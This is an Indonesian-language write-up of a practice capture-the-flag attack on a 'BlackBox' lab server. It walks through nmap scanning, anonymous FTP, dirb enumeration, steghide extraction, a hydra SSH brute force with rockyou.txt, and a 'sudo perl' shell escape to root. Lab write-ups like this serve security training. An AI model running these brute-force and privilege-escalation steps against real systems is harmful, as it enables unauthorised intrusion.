# Laporan Serangan Server BlackBox

Ini adalah hasil serangan yang telah dilakukan pada server BlackBox untuk latihan serangan.

## Pencarian IP Address Server

- cek ip pc : `ip a` atau `ifconfig` 
- nmap: `nmap -sP <network_id>/<prefix>`
- uji koneksi, kali linux dan server blackbox: `ping <ip_server>`

## Scan Port Server dengan NMAP
- nmap : `nmap <ip_server>`

**Port** yang terbuka dari server adalah :
- ftp (21)
- ssh (22)
- http (80)

## Access FTP dengan mode Anonymous
- buka filezilla
- install filezilla (jika belum ada) : `sudo apt install filezilla
- isi host : `<ip>` dan port : `21` Username dan Password kosong
- download gambar png yang tertera

## Cari semua Link public dari http (80)
- pakai tool dirb : `http:://<ip>`

## Temukan Petunjuk
- akses semua link yang ditemukan
- pada blog terdapat secret directory
- pada secret directory terdapat secret key

## Pentunjuk didalam Gambar PNG
- tool steghide
- install (jika belum) : `sudo apt install steghide`
- cara petunjuk : `steghide --extract -sf trytofind.jpg`
- masukkan passphrase dengan secret key yang ditemukan
- buka file hasil extract
- maka user ditemukan : `remu`

## Access SSH
- username telah ditemukan
- password, bruteforce dengan hydra
- cari file list password : `rockyou.txt`
- hydra : `hydra -l <user> -P <file>.txt ssh://<ip>`
- password ditemukan : `987654321`
- login server : `ssh remu@<ip>`

## Cari Flag
Setelah berhasil masuk server blackbox pada segera temukan flag
### Flag 1
- terdapat pada user remu
### Flag 2
- terdapat pada user lily
### Flag 3
- terdapat pada user root
- user remu tidak dapat akses root, oleh karena itu pindah user lily
- dari ssh remu, langsung ssh lagi ke lily : `ssh lily@<ip>`, tanpa password
- lily dapat mengakses root, karena kita tidak tahu password lily, maka gunakan exploit dengan perl
```
sudo perl -e ' exec "/bin/sh"; '
```
